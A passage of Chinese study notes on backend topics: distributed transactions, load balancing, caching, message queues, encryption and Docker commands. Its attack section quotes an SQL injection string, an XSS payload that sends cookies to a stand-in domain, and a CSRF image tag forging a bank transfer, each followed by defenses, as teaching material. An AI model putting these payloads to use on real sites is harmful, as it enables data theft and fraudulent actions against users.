- 可靠性：解决了XA协议的协调者单点故障问题，由主业务发起并控制整个业务活动，业务活动管理器也变成多点，引入集群。

##### 缺点：

- TCC的三个阶段操作功能要按具体业务来实现，业务耦合度较高，提高了开发成本。

## 负载均衡

- 集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点
- 负载均衡器会根据集群中每个节点的负载情况，将用户请求转发到合适的节点上
- 负载均衡器可以用来实现高可用以及伸缩性：
  - 高可用：当某个节点故障时，负载均衡器会将用户请求转发到另外的节点上，从而保证所有服务持续可用
  - 伸缩性：根据系统整体负载情况，可以很容易的添加或者移除节点
- 负载均衡器运行过程中：根据负载均衡算法得到转发的节点，然后进行转发
- **Nginx主要使用加权轮询、IP哈希、最少连接的方法作为负载均衡算法**

### 负载均衡算法

- 轮询
  - 把每个请求轮流发送到每个服务器上
  - 该算法比较适合每个服务器性能差不多的场景，如果存在性能差异的情况下，那么性能较差的服务器可能无法承担过大的负载
- 加权轮询
  - 在轮询的基础上，根据服务器性能差异，为服务器赋予一定的权值，性能高的服务器分配更高的权值
- 最少连接
  - 由于每个请求的连接时间不一样，适用轮询或者加权轮询的话，可能导致每台服务器当前连接数过大，而另一台连接过少，造成负载不均衡
  - 最少连接算法是将请求发送到当前最少连接数的服务器上
- 加权最少连接
  - 在最少连接算法的基础上，根据服务器的性能为每台服务器分配权重，在根据权重计算每台服务器能处理的连接数
- 随机算法
  - 随机发送到服务器上
- 源地址哈希法
  - 通过对客户端IP计算哈希值之后，再对服务器数量取模得到目标服务器序号
  - 可以保证同一个IP的客户端请求会转发到同一台服务器上，可以实现会话粘滞（sticky session）

### 转发实现

#### HTTP重定向

HTTP重定向负载均衡服务器使用某种负载均衡算法计算得到服务器的IP地址之后，将该地址写入HTTP重定向报文中，状态码为302。客户端收到重定向报文之后，需要重新向服务器发起请求。

缺点：

- 需要两次请求，因此访问延迟高
- HTTP负载均衡服务器处理能力有限，会限制集群的规模

#### DNS域名解析

在DNS解析域名的同时使用负载均衡算法计算服务器IP地址。

大型网站基本使用了 DNS 做为第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。也就是说，域名解析的结果为内部的负载均衡服务器 IP 地址。

优点：

- DNS能够根据地理位置进行域名解析，返回离用户最近的服务器IP地址

缺点：

- 由于DNS具有多级结构，每一级的域名记录都可能被缓存，当下线一台服务器需要修改DNS记录时，需要过很长一段时间才生效

#### 反向代理服务器

反向代理服务器位于源服务器前面，用户的请求需要先经过反向代理服务器才能到达源服务器。反向代理可以用来进行缓存、日志记录等，同时也可以用来做为负载均衡服务器。

在这种负载均衡转发方式下，客户端不直接请求源服务器，因此源服务器不需要外部 IP 地址，而反向代理需要配置内部和外部两套 IP 地址。

优点：

- 与其他功能集成在一起，部署简单

缺点：

- 所有请求和响应都需要经过反向代理服务器，它可能会成为性能瓶颈。

#### 网络层

在操作系统内核进程获取网络数据包，根据负载均衡算法计算源服务器的 IP 地址，并修改请求数据包的目的 IP 地址，最后进行转发。

源服务器返回的响应也需要经过负载均衡服务器，通常是让负载均衡服务器同时作为集群的网关服务器来实现。

优点：

- 在内核进程中进行处理，性能比较高。

缺点：

- 和反向代理一样，所有的请求和响应都经过负载均衡服务器，会成为性能瓶颈。

#### 数据链路层

在链路层根据负载均衡算法计算源服务器的 MAC 地址，并修改请求数据包的目的 MAC 地址，并进行转发。

通过配置源服务器的虚拟 IP 地址和负载均衡服务器的 IP 地址一致，从**而不需要修改 IP 地址就可以进行转发**。也正因为 IP 地址一样，所以源服务器的响应不需要转发回负载均衡服务器，可以直接转发给客户端，避免了负载均衡服务器的成为瓶颈。

这是一种**三角传输模式，被称为直接路由**。对于提供下载和视频服务的网站来说，直接路由避免了大量的网络传输数据经过负载均衡服务器。

这是目前大型网站使用最广负载均衡转发方式，在 Linux 平台可以使用的负载均衡服务器为 LVS（Linux Virtual Server）。

### 集群下的Session管理

一个用户的Session信息如果存储在一个服务器上，那么当负载均衡服务器把用户的下一个请求转发到另一台服务器，由于服务器没有用户的Session信息，那么该用户就需要重新进行登陆等操作。

#### Sticky Session

需要配置负载均衡器，使得一个用户的所有请求都路由到同一个服务器，这样就可以把用户的Session存放在该服务器。

缺点：

- 当服务器宕机时，将丢失服务器上的所有Session

#### Session Replication

在服务器之间进行Session同步操作，每个服务器都有所有用户的Session信息，因此用户可以向任何一个服务器进行请求。

缺点：

- 占用过多内存
- 同步过程占用网络宽带以及服务器处理器时间

#### Session Server

使用一个单独的服务器存储Session数据，可以使用传统的Mysql，也可以使用redis这种内存型数据库。

优点：

- 为了使得大型网站具有伸缩性，集群中的应用服务器通常需要保持无状态，那么应用服务器不能存储用户的会话信息。Session Server 将用户的会话信息单独进行存储，从而保证了应用服务器的无状态。

缺点：

- 需要实现存取Session的代码

## 缓存

### 缓存特征

#### 命中率

当某个请求能够通过f昂问缓存而得到响应时，称为缓存命中。

缓存命中率越高，缓存的利用率也就越高。

#### 最大空间

缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。

当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。

#### 淘汰策略

- FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。
- LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。
- LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。

### 缓存位置

#### 浏览器

当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。

#### ISP

网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。

#### 反向代理

反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。

#### 本地缓存

使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。

#### 分布式缓存

使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。

相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。

#### 数据库缓存

mysql等数据库管理系统你个具有自己的查询缓存机制来提高查询效率

### CDN

内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。

CDN 主要有以下优点：

- 更快地将数据分发给用户；
- 通过部署多台服务器，从而提高系统整体的带宽性能；
- 多台服务器可以看成是一种冗余机制，从而具有高可用性。

## 攻击技术

### SQL注入

利用一些查询语句的漏洞，将sql语句传递到服务器上的数据库运行非法的SQL语句，主要通过拼接来完成。

例如：

```mysql
strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
// 另
userName = "1' OR '1'='1";
passWord = "1' OR '1'='1";
// 那么
strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
// 此时
strSQL = "SELECT * FROM users;"
```

#### 防范手段

- 使用参数化查询：预先编译SQL语句函数，可以传入适当参数并且多次执行，由于没有拼接过程，因此可以防止SQL注入的发生。

### XSS跨站脚本攻击

（Cross-Site Scripting，XSS），可以将代码注入到用户浏览的网页上，这种代码包括HTML和JavaScript。当用户浏览此网页时，脚本就会在用户的浏览器上执行。

####  原理

加入在某论坛网站中攻击者发布以下内容

```css
<script>location.href="//domain.com/?c="+document.cookie</script>
```

之后该内容可能会被渲染成以下内容：

```css
<p><script>location.href="//domain.com/?c="+document.cookie</script></p>
```

#### 危害

- 窃取用户的cookie
- 伪造虚假的输入表单骗取个人信息
- 显示伪造的文章或者图片

#### 防范手段

- 设置Cookie为HttpOnly，可以防止JavaScript脚本调用，这样就无法通过document.cookie获取用户Cookie信息。
- 过滤特殊字符
  - 例如将`<`转义为`&lt;`，将`>`转义为`&gt;`，从而可以避免HTML和Javascript代码的运行。
  - 富文本编辑器允许用户输入HTML代码，就不能通过简单的转义字符进行过滤了，通常使用XSS filter来防范XSS攻击，通过定义一些标签白名单或者黑名单，从而不允许攻击性的HTML代码的输入。

### CSRF跨站请求伪造

（Cross-site Request Forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（比如发送邮件，发送消息，转账等）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

#### 原理

假如一家银行用已执行转账操作的URL地址如下：

```
http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName
```

那么，一个恶意攻击者可以在另一个网站上防止如下代码：

```
<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
```

如果有账户名为Alice的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她会损失1000美元。

这种恶意的网址有很多种形式，藏身于网页中的许多地方。此外攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地址藏在论坛，博客等任何用户生成内容的网站中，这意味着如果服务器没有合适的防御措施的话，用户即使访问熟悉的可信网站也可能有受攻击的危险。

但是攻击者并不能通过CSRF攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息，能做到的只是欺骗用户浏览器，让其以用户的名义执行操作。

#### 防范手段

- 验证码：因为CSRF攻击是在用户无意识的情况下发生的，所以要求用户数呼入验证码可以让用户直到自己正在做的操作。
- 添加校验Token：在访问敏感数据请求时，要求用户浏览器提供不存在Cookie中的，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

### DoS攻击

（Denial of Service，DoS），拒绝服务，目的是为了让计算机或者网络无法提供正常的服务。

单一的DoS攻击一般是采用一对一方式的，利用网络协议和操作系统的一些缺陷，采用欺骗和伪装的策略来进行我昂罗攻击，使网站服务器充斥大量要求回复的信息，消耗网络宽带和系统资源，导致网络或者系统不胜负荷以至于瘫痪而停止提供正常的网络服务。

#### DDoS攻击

分布式拒绝服务攻击DDoS是一种基于DoS的特殊形式的拒绝服务攻击，是一种分布式的，协同的大规模攻击方式。与DoS攻击相比，分布式拒绝服务攻击DDoS是借助数百甚至很多台主机发起的集团行为。

#### 攻击方式

- SYN Flood：客户端在短时间内伪造大量不存在的IP地址，向服务器不断地发送SYN包，服务器会根据IP地址回复确认包，并等待客户端的确认，由于源地址是不存在的，服务器需要不断地重发直到超时，这些伪造的SYN包将长时间占用未连接队列，正常的SYN请求被丢弃，目标系统运行缓慢，甚至会引起系统瘫痪。
  - 防御：
  - cookie源认证：响应的syn_ack上带上特定的sequence numbera。真实的客户端会返回一个sn+1，而伪造的客户端不会做出响应，这样将真实ip加入白名单，下次访问直接通过，其他的进行拦截。
  - TCP首包丢弃，利用了TCP/IP协议的重传特性，来自某个源IP的第一个syn包到达时被直接丢第并记录状态，在该源IP的第2个syn包到达时进行验证，然后放行。
- UDP Flood：属于带宽类攻击，通过向目标服务器发送大量的UDP报文，这种UDP报文通常为大包并且速率非常快，通常会引起：
  - 消耗网络宽带资源，严重时造成 链路阻塞；大量变源变端口的UDP Flood会导致依靠会话转发的网络设备性能降低甚至会话耗尽，从而导致网络瘫痪；如果攻击报文到达服务器开放的UDP业务端口，服务器检查报文的正确性需要消耗计算资源，影响正常业务。
  - 防御：
  - 关联TCP服务防范：有些服务比如游戏类服务，先通过TCP协议对用户进行认证，认证通过后使用UDP协议传输业务数据。当收到攻击时，对关联的TCP业务强制启动防御，通过关联防御产生白名单，命中白名单的源的UDP允许通过，否则丢弃。
  - 载荷检查：当UDP流量超过阈值时会触发载荷检查，如果UDP报文数据段内容完全一样，则会被认为是攻击而丢弃报文。

## 消息队列(MQ)

### 消息模型

#### 点对点

消息生产者向消息队列中发送了一个消息之后，只能被一个消费者消费一次。

#### 发布/订阅

消息生产者向频道发送一个消息之后，多个消费者可以从该频道订阅到这条消息并消费

#### 观察者模式和发布/订阅模式的区别

- 观察者模式中，观察者和主题都知道对方的存在；而发布/订阅模式中，生产者和消费者不知道对方的存在，他们之间通过频道进行通信。
- 观察者模式是同步的，当事件触发时，主题会调用观察者的方法，然后等待方法返回；而发布/订阅模式是异步的，生产者向频道发送一个消息之后，就不需要关心消费者何时去订阅这个消息，可以立即返回。

### 使用场景

#### 异步处理

发送者将消息发送给消息队列之后，不需要同步等待消息接收者处理完毕，而是立即返回进行其它操作。消息接收者从消息队列中订阅消息之后异步处理。

例如在注册流程中通常需要发送验证邮件来确保注册用户身份的合法性，可以使用消息队列使发送验证邮件的操作异步处理，用户在填写完注册信息之后就可以完成注册，而将发送验证邮件这一消息发送到消息队列中。

只有在业务流程允许异步处理的情况下才能这么做，例如上面的注册流程中，如果要求用户对验证邮件进行点击之后才能完成注册的话，就不能再使用消息队列。

#### 流量削峰

在高并发的场景下，如果短时间有大量的请求到达会压垮服务器。

可以将请求发送到消息队列中，服务器按照其处理能力从消息队列中订阅消息进行处理。

#### 应用解耦

如果模块之间不直接进行调用，模块之间耦合度就会很低，那么修改一个模块或者新增一个模块对其它模块的影响会很小，从而实现可扩展性。

通过使用消息队列，一个模块只需要向消息队列中发送消息，其它模块可以选择性地从消息队列中订阅消息从而完成调用。

### 可靠性

#### 发送端的可靠性

发送端完成操作后一定能将消息成功发送到消息队列中。

实现方法：在本地数据库建一张消息表，将消息数据与业务数据保存在同一数据库实例里，这样就可以利用本地数据库的事务机制。事务提交成功后，将消息表中的消息转移到消息队列中，若转移消息成功则删除消息表中的数据，否则继续重传。

#### 接收端的可靠性

接收端能够从消息队列成功消费一次消息。

两种实现方法：

- 保证接收端处理消息的业务逻辑具有幂等性：只要具有幂等性，那么消费多少次消息，最后处理的结果都是一样的。
- 保证消息具有唯一编号，并使用一张日志表来记录已经消费的消息编号。

## 加密算法

### 对称加密算法

AES，DES，3DES。对称加密算法是指加密和解密采用相同的密钥，是可逆的（即可解密）。

优点：加密速度快

缺点：密钥的传递和保存是一个问题，参与加密和解密的双方使用的密钥是一样的，这样密钥很容易泄露。

### 非对称加密算法

RSA，DSA，ECC。非对称加密算法是指加密和解密采用不同的密钥（公钥和私钥），因此非对称加密也叫公钥加密，是可逆的（即可解密）。公钥密码体制根据其所依据的难题一般分为三类：大素数分解问题类、离散对数问题类、椭圆曲线类。

优点：加密和解密的密钥不一致，公钥是可以公开的，只需要保证私钥不被泄露即可，这样密钥的传递变得简单很多，从而降低了被破解的难度。

缺点：加密速度慢

### 线性散列算法

MD5，SHA1，HMAC。属于单向算法（即不能被解密）。常用在不可还原的密码存储，信息完整性校验等。

典型应用场景是对一段信息产生信息摘要，以防止被篡改。

硬软中断：https://blog.51cto.com/noican/1361087

# Docker

Docker是在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等，极大的简化了容器的创建和维护。使得docker技术比虚拟机更为轻便、快捷。

## 与传统虚拟机比较

- 传统虚拟机：虚拟出一套硬件，在其上运行一个完整的操作系统，在该系统上再运行应用程序
- docker：容器内的应用程序直接运行于宿主的内核中，**容器内没有自己的内核**，而且没有进行硬件虚拟；每个容器内都有一个属于自己的文件系统，互不影响。

## Docker优势

- 更高效的利用系统资源：内核级别的虚拟化，可以在一个物理机上运行很多的容器实例
- 更快速的启动速度
- 一致的运行环境
- 持续交付和部署
- 更轻松地迁移
- 更轻松的维护和扩展

## Docker概念

- 镜像（Image）：docker镜像就像一个模板，可以通过这个模板来创建容器服务。通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中）
- 容器（Container）：Docker利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的。具有启动、停止、删除等一些基本命令。可以把容器理解为一个简易的linux系统。
- 仓库（Repository）：仓库就是存放镜像的地方。

![image-20200730172148589](..\assets\post\others\docker.png)

## 底层原理

### Docker是怎么工作的？

Docker 是一个Client-Server结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问。

Docker相对于VM有更少的抽象层。他利用的是宿主机的内核，VM需要guest OS

![image-20200730104701884](..\assets\post\others\vmdocker.png)

## 常用命令

### 帮助命令

```shell
docker version
docker info		// 显示docker系统信息，包括镜像和容器的数量
docker 命令 --help	// 帮助命令
```

### 镜像命令

```shell
docker images	// 查看主机上的所有镜像
docker search image-name		// 搜索远程仓库镜像
docker pull image-name[:tag]	// 下载远程镜像
docker rmi -f image-name/image-id	// 删除指定镜像
docker rmi -f $(docker images -aq)	// 删除所有镜像
```

### 容器命令

```shell
docker pull image-name			// 新建容器
docker run [可选参数] image		// 启动一个全新的容器
docker run -d --name nginx01 -p 3344:80 nginx
-d	// 后台运行
--name	// 名字
-p	// 外部端口映射，使用主机的3344端口映射到容器内的80端口

docker ps	// 列出运行中的容器
-a			// 列出所有运行过的容器
exit		// 退出容器
ctrl+p+q	// 不停止容器退出
docker attach container-id 	// 进入一个正在运行的容器终端，不会开启一个新的终端 
docker exec -it container-id /bin/bash	// 进入容器并开启一个新的终端

docker start 容器id		// 启动一个停止的容器
docker restart 容器id		// 重启
docker stop 容器id		// 停止当前容器
docker kill 容器id		// 强制停止当前容器
```

### 其他命令

```shell
docker run -d centos		// 后台启动
// docker容器使用后台运行，就必须有一个前台进程，如果没有应用，docker就会自动停止
docker logs					// 查看日志
-tf							// 显示日志
--tail number				// 要显示的日志条数
docker inspect container-id	// 查看容器信息

docker cp container-id:path dstpath
```

## Docker镜像

镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件，它包含运行某个软件所需要的所有内容，包括代码、运行时库、环境变量和配置文件等。

所有的应用，直接打包docker镜像，可以直接跑起来。

### Docker镜像加载原理

- UnionFS（联合文件系统）
  - 一种分层、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层的叠加，同时可以将不同目录挂载到同一个虚拟文件系统下（unite several directories into a single virtual filesystem）
  - Union文件系统是Docker镜像的基础。镜像可以通过分层来进行继承，基于基础镜像（没有父镜像），可以制作各种具体的应用镜像。
  - 特性：一次同时加载多个文件系统，但从外面看起来，只能看到一个文件系统，联合加载会把各层文件系统叠加起来，这样最终的文件系统会包含所有底层文件和目录。
- Docker镜像加载原理
  - Docker的镜像实际上有一层一层的文件系统组成，这种层级的文件系统UnionFS。
  - bootfs（boot file system）主要包含bootloader和kernel，bootloader主要是引导加载kernel，Linux刚启动时会加载bootfs文件系统，在Docker镜像的最底层是bootfs。这一层与典型的Linux/Unix系统是一样的，包含bootloader和kernel。当boot加载完成之后整个内核就都在内存中了，此时内存的使用权已由bootfs转交给内核，此时系统会卸载bootfs。
  - rootfs（root file system），在bootfs之上，包含的就是典型linux系统中的/dev，/proc，/bin，/etc等标准目录和文件。rootfs就是各种不同的操作系统发行版，比如ubuntu、centos等等。
  - 对于一个精简的OS，rootfs可以很小，只需要包含最基本的命令，工具和程序库就可以了，因为底层直接用host的kernel，自己只需要提供rootfs就可以了。由此可见对于不同的linux发行版，bootfs基本是一致的，rootfs会有差别，因此不同的发行版可以公用bootfs。
- Docker镜像都是只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。这一层被称为容器层，容器之下的都叫做镜像层。

## 容器数据卷

容器之间的一个数据共享的技术，docker容器产生的数据，同步到本地。

目录的挂载，将我们容器内的目录，挂载到linux上面。

容器数据卷技术是为了容器的持久化和同步操作。容器间数据也是可以共享的。

### 使用数据卷

- 创建容器时直接使用命令来挂载 `-v`

- ```
  docker run -it -v 主机目录：容器内目录
  ```

#### 具名和匿名挂载

- 匿名挂载：只指定容器内路径
- 具名挂载：`-v 卷名：容器内路径`
- 指定路径挂载：`-v 宿主机路径：容器内路径`
- 指定权限：`-v :容器内路径：ro/rw`，ro表示只读，rw表示可读可写，是针对容器内的文件
- ro表示只读，容器内无权限进行修改，只能在宿主机操作。

### Dockerfile

dockerfile就是用来构建docker镜像的构建文件，命令脚本。

通过这个脚本可以生成一个镜像。镜像是一层一层的，那么脚本也是一个一个的命令，一个命令就是一层。

```
FROM centos
VOLUME ["volume01", "volume02"]
CMD echo "--end--"
CMD /bin/bash 
// 每一句就是一层
```

可以使用`docker inspect container-id`查看卷挂载的目录

#### 基础知识

- 每个保留关键字（指令）都必须是大写字母
- 执行从上到下顺序执行
- #表示注释
- 每一个指令都会创建提交一个新的镜像层，并提交。

Dockerfile是面向开发的，以后发布项目，做镜像，就需要编写dockerfile文件。

#### Dockerfile指令

 ```shell
FROM				# 基础镜像，一切从这里开始构建
MAINTAIN			# 镜像是谁写的，一般为名字+邮箱
RUN					# 镜像构建的时候需要运行的命令
ADD					# 向里面添加内容，比如tomcat等
WORKDIR				# 镜像的工作目录
VOLUME				# 挂载卷目录
EXPOSE				# 指定暴露的端口
RUN					# 开始运行
CMD					# 指定启动的时候要运行的命令，只有最后一个会生效，可以被替代，不能追加命令
ENTRYPOINT			# 指定启动的时候要运行的命令，可以追加命令
ONBUILD				# 当构建一个被继承dockerfile时候会运行这个指令。是一个触发指令
COPY				# 类似于COPY，将文件拷贝到镜像
ENV					# 构建的时候设置环境变量
 ```

例子：

```shell
FROM centos
# 设置维护者名称
MAINTAINER elbow95
# 设置环境变量
ENV MYPATH /usr/local
# 设置工作目录
WORKDIR $MYPATH
# 安装软件
RUN yum -y install vim
RUN yum -y install net-tools
# 暴露端口
EXPOSE 80
CMD echo $MYPATH
CMD echo "---end---"
CMD /bin/bash
```



  